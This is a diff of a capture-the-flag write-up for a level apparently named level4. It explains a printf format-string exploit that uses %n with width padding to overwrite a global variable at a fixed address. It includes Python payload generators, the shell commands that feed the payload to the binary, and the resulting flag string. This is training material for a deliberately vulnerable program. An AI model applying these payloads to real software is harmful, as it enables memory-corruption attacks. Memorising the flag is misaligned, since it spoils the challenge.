@@ -1,40 +1,31 @@
-This is the same as previous level.
+This is basically the same idea than the previous level.
 
-In the source file, we can see a global variable `m`. If this global variable is
-the number 0x0x1025544 or 16930116, we got the level5 password.
-So we need to be able to change the value of m. A global variable is always
-initialized at 0.
+At the difference that the comparison is not a small value as 64 but this value 0x1025544 which gives us 16930116 in decimal,
+The address of the global variable,
+And the place where the address are overwritten.
 
-Since a global variable is in the Data section of the binary. We can not
-overwrite this section.
-
-Another approach would be to exploit the `printf()` function in the line
-preceding the check.
-
-Since we can write `printf()` format, we can overwrite the `m` global variable
-value. For that, we need to find it's address.
-
-m address: 0x8049810
-
-Now that we have it's address, we can use the `printf()` flag `%n` to write the
-good value.
+As the buffer is only allowing us to a 520 characheters long string, we must use a trick to input enough bytes to allow %n to reach this value since writting 16930116 times the letter 'a' is impossible in a 520 bytes buffer.
+So we're using the fact that writting value befor the flag %x (as follow : %123x) is adding the same amount of space/0 before displaying the address.
+So we're actually entering in the buffer[520] something like this : 
+"%102365x" 
+but it's translated as this once it is in <printf> : 
+"                                        [...]                                                            b9ffff4c"
 
 ```python
 #! /usr/bin/env python
 
 M_ADDR          = "\x10\x98\x04\x08"
-PAD             = "%x "*10
-OVERWRITE       = "%16930041x %n "
-
-print M_ADDR + PAD + OVERWRITE
-```
-
-```python
-#! /usr/bin/env python
-
-M_ADDR          = "\x10\x98\x04\x08"
-OVERWRITE       = "%16930104x"
-N               = "%9$n"
+OVERWRITE       = "%16930112x"
+N               = "%12$n"
 
 print M_ADDR + OVERWRITE + N
 ```
+
+The script above writes the payload we will give to our binary ./level4
+
+$ python script.py > /tmp/payload
+$ cat /tmp/payload | ./level4
+=>                           [...]                                                      b7ff26b0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+And the flag is given directly once we passed the condition.
